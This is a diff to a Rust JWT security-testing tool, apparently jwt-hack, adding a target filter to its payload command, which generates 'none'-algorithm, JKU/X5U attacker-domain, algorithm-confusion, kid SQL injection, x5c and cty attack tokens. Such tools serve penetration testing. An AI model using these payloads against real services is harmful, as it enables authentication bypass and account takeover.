@@ -3,16 +3,17 @@ use base64::{engine::general_purpose, Engine as _};
 use log::info;
 use serde_json::json;
 use colored::Colorize;
+use std::collections::HashSet;
 
 use crate::jwt;
 use crate::utils;
 
 /// Execute the payload command
-pub fn execute(token: &str, jwk_trust: Option<&str>, jwk_attack: Option<&str>, jwk_protocol: &str) {
+pub fn execute(token: &str, jwk_trust: Option<&str>, jwk_attack: Option<&str>, jwk_protocol: &str, target: Option<&str>) {
     utils::log_info(format!("Generating attack payloads for token: {}", utils::format_jwt_token(token)));
-    if let Err(e) = generate_payloads(token, jwk_trust, jwk_attack, jwk_protocol) {
+    if let Err(e) = generate_payloads(token, jwk_trust, jwk_attack, jwk_protocol, target) {
         utils::log_error(format!("Error generating payloads: {}", e));
-        utils::log_error("e.g jwt-hack payload {JWT_CODE} --jwk-attack attack.example.com --jwk-trust trust.example.com");
+        utils::log_error("e.g jwt-hack payload {JWT_CODE} --jwk-attack attack.example.com --jwk-trust trust.example.com --target none,jku,alg_confusion");
     }
 }
 
@@ -21,6 +22,7 @@ fn generate_payloads(
     jwk_trust: Option<&str>,
     jwk_attack: Option<&str>,
     jwk_protocol: &str,
+    target: Option<&str>,
 ) -> Result<()> {
     // Decode the JWT token to get claims
     let decoded = jwt::decode(token)?;
@@ -34,27 +36,113 @@ fn generate_payloads(
 
     let claims_part = token_parts[1];
 
-    utils::log_info("Generating 'none' algorithm attack payloads");
-    let spinner = utils::start_progress("Creating none algorithm variants...");
+    // Parse target parameter
+    let targets: HashSet<String> = match target {
+        Some(t) => t.split(',')
+            .map(|s| s.trim().to_lowercase())
+            .collect(),
+        None => HashSet::from(["all".to_string()])
+    };
     
-    // Generate none algorithm payloads
-    generate_none_payloads(claims_part, "none")?;
-    generate_none_payloads(claims_part, "NonE")?;
-    generate_none_payloads(claims_part, "NONE")?;
+    // Available target types
+    let valid_targets = ["all", "none", "jku", "x5u", "alg_confusion", "kid_sql", "x5c", "cty"];
+    for t in &targets {
+        if !valid_targets.contains(&t.as_str()) && t != "all" {
+            utils::log_warning(format!("Unknown target type: '{}'. Valid types are: {}", t, valid_targets.join(", ")));
+        }
+    }
     
-    spinner.finish_and_clear();
-
-    // Generate URL payloads if attack domain is provided
-    if let Some(attack_domain) = jwk_attack {
-        utils::log_info(format!("Generating URL-based attack payloads using domain: {}", attack_domain.bright_yellow()));
-        let spinner = utils::start_progress("Creating JKU and X5U payloads...");
+    let should_generate_all = targets.contains("all");
+    
+    // Generate none algorithm payloads if requested
+    if should_generate_all || targets.contains("none") {
+        utils::log_info("Generating 'none' algorithm attack payloads");
+        let spinner = utils::start_progress("Creating none algorithm variants...");
         
-        generate_url_payloads(claims_part, jwk_trust, attack_domain, jwk_protocol)?;
+        generate_none_payloads(claims_part, "none")?;
+        generate_none_payloads(claims_part, "NonE")?;
+        generate_none_payloads(claims_part, "NONE")?;
         
         spinner.finish_and_clear();
-    } else {
+    }
+
+    // Generate URL payloads if attack domain is provided and if requested
+    if let Some(attack_domain) = jwk_attack {
+        if should_generate_all || targets.contains("jku") || targets.contains("x5u") {
+            utils::log_info(format!("Generating URL-based attack payloads using domain: {}", attack_domain.bright_yellow()));
+            let spinner = utils::start_progress("Creating JKU and X5U payloads...");
+            
+            generate_url_payloads(claims_part, jwk_trust, attack_domain, jwk_protocol, &targets, should_generate_all)?;
+            
+            spinner.finish_and_clear();
+        }
+    } else if should_generate_all || targets.contains("jku") || targets.contains("x5u") {
         utils::log_warning("No attack domain provided. Skipping URL-based payloads.");
         utils::log_info("To generate URL payloads, use --jwk-attack parameter.");
+    }
+    
+    // Generate algorithm confusion payloads if requested
+    if should_generate_all || targets.contains("alg_confusion") {
+        utils::log_info("Generating algorithm confusion attack payloads");
+        let spinner = utils::start_progress("Creating algorithm confusion variants...");
+        
+        if let Ok(payloads) = crate::payload::generate_alg_confusion_payload(token, None) {
+            for payload in payloads {
+                println!("\n{}", "━━━ Algorithm Confusion Payload (RS256->HS256) ━━━".bright_cyan().bold());
+                println!("{}", payload);
+                println!();
+            }
+        }
+        
+        spinner.finish_and_clear();
+    }
+    
+    // Generate kid SQL injection payloads if requested
+    if should_generate_all || targets.contains("kid_sql") {
+        utils::log_info("Generating kid SQL injection attack payloads");
+        let spinner = utils::start_progress("Creating kid SQL injection variants...");
+        
+        if let Ok(payloads) = crate::payload::generate_kid_sql_payload(token) {
+            for payload in payloads {
+                println!("\n{}", "━━━ kid SQL Injection Payload ━━━".bright_cyan().bold());
+                println!("{}", payload);
+                println!();
+            }
+        }
+        
+        spinner.finish_and_clear();
+    }
+    
+    // Generate x5c header injection payloads if requested
+    if should_generate_all || targets.contains("x5c") {
+        utils::log_info("Generating x5c header injection attack payloads");
+        let spinner = utils::start_progress("Creating x5c header injection variants...");
+        
+        if let Ok(payloads) = crate::payload::generate_x5c_payload(token) {
+            for payload in payloads {
+                println!("\n{}", "━━━ x5c Header Injection Payload ━━━".bright_cyan().bold());
+                println!("{}", payload);
+                println!();
+            }
+        }
+        
+        spinner.finish_and_clear();
+    }
+    
+    // Generate cty header manipulation payloads if requested
+    if should_generate_all || targets.contains("cty") {
+        utils::log_info("Generating cty header manipulation attack payloads");
+        let spinner = utils::start_progress("Creating cty header variants...");
+        
+        if let Ok(payloads) = crate::payload::generate_cty_payload(token) {
+            for payload in payloads {
+                println!("\n{}", "━━━ cty Header Manipulation Payload ━━━".bright_cyan().bold());
+                println!("{}", payload);
+                println!();
+            }
+        }
+        
+        spinner.finish_and_clear();
     }
 
     Ok(())
@@ -91,11 +179,22 @@ fn generate_url_payloads(
     jwk_trust: Option<&str>,
     jwk_attack: &str,
     jwk_protocol: &str,
+    targets: &HashSet<String>,
+    should_generate_all: bool,
 ) -> Result<()> {
-    let jku_payloads = [
-        ("jku", jwk_attack.to_string()),
-        ("x5u", jwk_attack.to_string()),
-    ];
+    let mut jku_payloads = Vec::new();
+    
+    if should_generate_all || targets.contains("jku") {
+        jku_payloads.push(("jku", jwk_attack.to_string()));
+    }
+    
+    if should_generate_all || targets.contains("x5u") {
+        jku_payloads.push(("x5u", jwk_attack.to_string()));
+    }
+    
+    if jku_payloads.is_empty() {
+        return Ok(());
+    }
 
     for (key_type, domain) in jku_payloads {
         // Basic payload
